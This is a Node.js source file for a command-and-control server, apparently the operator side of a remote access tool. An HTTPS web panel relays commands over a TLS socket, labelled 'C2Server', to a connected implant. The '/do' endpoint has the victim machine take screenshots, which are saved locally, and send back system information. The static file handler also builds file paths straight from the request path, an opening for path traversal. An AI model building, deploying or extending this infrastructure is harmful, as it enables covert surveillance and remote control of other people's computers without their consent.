const https = require('https');
const url = require('url');
const fs = require('fs');
const ejs = require('ejs');
// const net = require('net');
const tls = require('tls');
const path = require('path');

let integ = 5;
let so_id;
let wdir = "./web/"
let adir = "./artifacts/"
// Налаштування порту
const WEB_PORT = 3000;
const C2_PORT = 3001;

const options = {
    key: fs.readFileSync('cert/privatekey.pem'),
    cert: fs.readFileSync('cert/certificate.pem'),
};

// Створення сервера
const server = https.createServer(options, (req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const path_ = parsedUrl.pathname;
    const query = parsedUrl.query;
    // console.log(parsedUrl);
    console.log(path_);
    // console.log(query);

    switch(req.method) {
        case 'GET':
            switch (path_){
                case '/doit':
                    res.writeHead(200, { 'Content-Type': 'text/plain' });
                    // res.end(`Hello ${query.name}, you number ${integ} and id:${query.id}`);
                    ejs.renderFile(wdir + 'page2.ejs', { integ: integ, query: query }, (err, str) => {
                        if (err) {
                            res.writeHead(500, { 'Content-Type': 'text/plain' });
                            res.end('Server error');
                        } else {
                            res.writeHead(500, { 'Content-Type': 'text/html' });
                            res.end(str);
                        }
                    })
                    break;
                case '/':
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    fs.readFile(wdir + 'serv.html', (err, data) => {
                        if (err) {
                            res.writeHead(500, { 'Content-Type': 'text/plain' });
                            res.end('Server error');
                        } else {
                            res.writeHead(200, {'Content-Type': 'text/html'});
                            res.end(data);
                        }
                    })
                    break;
                default:
                    const extname = String(path.extname(path_)).toLowerCase();
                    const mimeTypes = {
                        '.html': 'text/html',
                        '.js': 'text/javascript',
                        '.css': 'text/css',
                        '.json': 'application/json',
                        '.ico': 'image/x-icon',
                        '.png': 'image/png',
                        '.jpg': 'image/jpg',
                        '.gif': 'image/gif',
                        '.svg': 'image/svg+xml',
                        '.woff': 'application/font-woff',
                        '.woff2': 'application/font-woff2',
                        '.otf': 'application/font-otf',
                        '.ttf': 'application/font-ttf',
                        '.eot': 'application/vnd.ms-fontobject',
                        '.pdf': 'application/pdf',
                        '.zip': 'application/zip',
                        '.txt': 'text/plain',
                    };
                    const contentType = mimeTypes[extname] || 'application/octet-stream';
                    fs.readFile(wdir + path_, (error, content) => {
                        if (error) {
                            if (error.code === 'ENOENT') {
                                res.writeHead(404, { 'Content-Type': 'text/html' });
                                res.end('<h1>404 Not Found</h1>', 'utf-8');
                            } else {
                                res.writeHead(500);
                                res.end('Sorry, there was an error: ' + error.code + ' ..\n');
                            }
                        } else {
                            res.writeHead(200, { 'Content-Type': contentType });
                            res.end(content, 'utf-8');
                        }
                    });
            }
            break;
        case 'POST':
            let body = '';
            req.on('data', ch => {
                body += ch.toString();
            });
            switch(path_){
                case '/send-id':
                    req.on('end', () => {
                        const params = new URLSearchParams(body);
                        const id = Number(params.get('id'));
                        console.log(`id: ${id}`);
                        if (so_id && !so_id.destroyed && !isNaN(id)) {
                            so_id.write(JSON.stringify({com: id}));
                            so_id.once('data', (data) => {
                                res.writeHead(200, { 'Content-Type': 'text/plain' });
                                res.end(`Client response: ${data}`);
                            })

                        } else {
                            res.writeHead(500, { 'Content-Type': 'text/plain' });
                            res.end('No TCP client connected or bad comand');
                        }
                    });

                    res.on('error', (err) => {
                        console.error(`Error: ${err}`);
                        res.writeHead(500, { 'Content-Type': 'text/plain' });
                        res.end('Server error');
                    });
                    break;
                case '/do':
                    req.on('end', () => {
                        if (so_id && !so_id.destroyed) {
                            const root = JSON.parse(body);
                    
                            // Clean previous listeners if necessary
                            so_id.removeAllListeners();
                    
                            switch(root.action) {
                                case 'take_screenshot':
                                    so_id.write(JSON.stringify({ com: 0 }) + '\n\n\n');
                                    
                                    let screenshotData = '';
                    
                                    // Listen for incoming data for screenshot
                                    so_id.on('data', (data) => {
                                        screenshotData += data.toString();
                    
                                        // Process complete messages whenever the delimiter '\n\n\n' appears
                                        while (screenshotData.includes('\n\n\n')) {
                                            const delimiterIndex = screenshotData.indexOf('\n\n\n');
                                            const message = screenshotData.slice(0, delimiterIndex);
                                            screenshotData = screenshotData.slice(delimiterIndex + 3);
                    
                                            try {
                                                const parsedData = JSON.parse(message);
                                                res.writeHead(200, { 'Content-Type': 'application/json' });
                    
                                                const binpng = Buffer.from(parsedData.img, 'base64');
                                                fs.writeFile(`${adir}screenshot_${Math.floor(Date.now() / 1000)}.png`, binpng, (err) => {
                                                    if (err) {
                                                        console.error('Error writing file:', err);
                                                    } else {
                                                        console.log('File created successfully!');
                                                    }
                                                });
                    
                                                // Send JSON response with the parsed image data
                                                res.end(JSON.stringify({ status: "OK", screenshot: `data:image/png;base64,${parsedData.img}` }));
                                            } catch (error) {
                                                console.error('Error parsing JSON:', error);
                                                res.writeHead(500, { 'Content-Type': 'application/json' });
                                                res.end(JSON.stringify({ status: "error", message: "Invalid JSON received" }));
                                            }
                                        }
                                    });
                    
                                    // Handle connection end
                                    so_id.on('end', () => {
                                        console.log("Connection ended for screenshot");
                                    });
                    
                                    // Handle socket errors
                                    so_id.on('error', (err) => {
                                        console.error('Stream error:', err);
                                        res.writeHead(500, { 'Content-Type': 'application/json' });
                                        res.end(JSON.stringify({ status: "error", message: "Stream error" }));
                                    });
                                    break;
                    
                                case 'get_system_info':
                                    so_id.write(JSON.stringify({ com: 1 }) + '\n\n\n');
                                    
                                    let systemInfoData = '';
                    
                                    // Listen for incoming data for system info
                                    so_id.on('data', (data) => {
                                        systemInfoData += data.toString();
                    
                                        // Process complete messages whenever the delimiter '\n\n\n' appears
                                        while (systemInfoData.includes('\n\n\n')) {
                                            const delimiterIndex = systemInfoData.indexOf('\n\n\n');
                                            const message = systemInfoData.slice(0, delimiterIndex);
                                            systemInfoData = systemInfoData.slice(delimiterIndex + 3);
                    
                                            try {
                                                res.writeHead(200, { 'Content-Type': 'application/json' });
                                                res.end(message);
                                            } catch (error) {
                                                console.error('Error parsing JSON:', error);
                                                res.writeHead(500, { 'Content-Type': 'application/json' });
                                                res.end(JSON.stringify({ status: "error", message: "Invalid JSON received" }));
                                            }
                                        }
                                    });
                    
                                    // Handle connection end
                                    so_id.on('end', () => {
                                        console.log("Connection ended for system info");
                                    });
                    
                                    // Handle socket errors
                                    so_id.on('error', (err) => {
                                        console.error('Stream error:', err);
                                        res.writeHead(500, { 'Content-Type': 'application/json' });
                                        res.end(JSON.stringify({ status: "error", message: "Stream error" }));
                                    });
                                    break;
                    
                                default:
                                    console.log(`${root.action} not recognized`);
                                    res.writeHead(400, { 'Content-Type': 'application/json' });
                                    res.end(JSON.stringify({ status: "error", message: "Invalid action" }));
                                    break;
                            }
                        } else {
                            res.writeHead(500, { 'Content-Type': 'application/json' });
                            res.end(JSON.stringify({ status: "error", message: "Client is disconnected" }));
                        }
                    });                    
                break;
            }
            break;
    }
});

const server2 = tls.createServer(options, (so) => {
    console.log(`Client connected with: ${so.remoteAddress}:${so.remotePort}`);
    so_id = so;

    so.on('data', (data) => {
        //console.log(`Resv data: ${data}`);
        // so.write(`Send: ${integ}\n`);
    });

    so.on('end', () => {
        console.log('Client disconect');
    });

    so.on('error', (err) => {
        console.error(`Error: ${err}`);
    });
});

// Запуск сервера
server.listen(WEB_PORT, () => {
    console.log(`WebServer is running at http://172.16.218.140:${WEB_PORT}`);
});

server2.listen(C2_PORT, () => {
    console.log(`C2Server is running at http://172.16.218.140:${C2_PORT}`);
});


